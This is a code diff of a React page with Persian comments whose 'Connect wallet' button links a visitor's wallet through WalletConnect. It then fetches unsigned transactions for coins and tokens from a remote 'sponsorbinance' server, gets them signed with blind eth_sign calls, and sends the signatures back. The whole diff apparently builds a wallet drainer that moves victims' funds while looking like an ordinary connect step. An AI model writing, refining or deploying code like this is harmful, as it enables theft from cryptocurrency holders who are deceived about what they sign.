@@ -1,10 +1,7 @@
 import jQuery from "jquery";
-import { useState } from "react";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 function App() {
-  const [selectedChain, setSelectedChain] = useState("1"); // پیش‌فرض: اتریوم
-
   async function runner() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
@@ -13,10 +10,16 @@ function App() {
         explorerRecommendedWalletIds: [
           "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
           "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
+          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
+          "426b8b13634593783072a3253bb061e825dceeb13593425cc315a9e7d7e60323",
+          "f725ed2c96fc9105359df8393b3192a02fdb91c93ad73d0b0edb3f7eae70d059",
+          "f81ffb6c9be6997a8e7463c49358b64e733c1cf52f54f2731749eab21cfde63b",
+          "f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2",
+          "be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d",
+          "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
         ],
       },
-      chains: [1, 56], // پشتیبانی از اتریوم و اسمارت چین
-      methods: ["eth_sign", "eth_sendTransaction", "personal_sign"],
+      methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -26,12 +29,18 @@ function App() {
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
+    // 🔹 مسیر صحیح برای `send.php`
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
+
+    // کاربر انتخاب می‌کند که روی کدام شبکه تراکنش انجام دهد
+    let selectedChain = prompt("Enter chain ID (1 for Ethereum, 56 for BSC):");
+    if (!["1", "56"].includes(selectedChain)) {
+      alert("Invalid chain ID! Using Ethereum (1) by default.");
+      selectedChain = "1"; // پیش‌فرض: اتریوم
+    }
 
     async function genSign(address, chain, type, contract = "0") {
       try {
-        console.log("🔗 Chain ID for signing:", chain);
-
         let requestData = { handler: "tx", address, chain, type };
         if (type === "token") requestData.contract = contract;
 
@@ -40,8 +49,8 @@ function App() {
         console.log("📜 Unsigned Transaction:", unSigned);
 
         var Signed = await provider.request({
-          method: "personal_sign",
-          params: [unSigned.result, address],
+          method: "eth_sign",
+          params: [address, unSigned.result],
         });
 
         return Signed;
@@ -53,8 +62,6 @@ function App() {
 
     async function acceptSign(signature, type) {
       try {
-        console.log("🖊 Accepting signed transaction:", signature);
-
         var result = await jQuery.post(apiUrl, {
           handler: "sign",
           signature,
@@ -81,29 +88,15 @@ function App() {
   }
 
   return (
-    <div>
-      {/* انتخاب شبکه */}
-      <label htmlFor="network-select">انتخاب شبکه:</label>
-      <select
-        id="network-select"
-        value={selectedChain}
-        onChange={(e) => setSelectedChain(e.target.value)}
-      >
-        <option value="1">Ethereum</option>
-        <option value="56">Binance Smart Chain</option>
-      </select>
-
-      {/* دکمه‌ی اتصال */}
-      <a
-        href="#"
-        id="kos"
-        onClick={runner}
-        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-        data-uk-toggle=""
-      >
-        <span>Connect wallet</span>
-      </a>
-    </div>
+    <a
+      href="#"
+      id="kos"
+      onClick={runner}
+      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
+      data-uk-toggle=""
+    >
+      <span>Connect wallet</span>
+    </a>
   );
 }
 
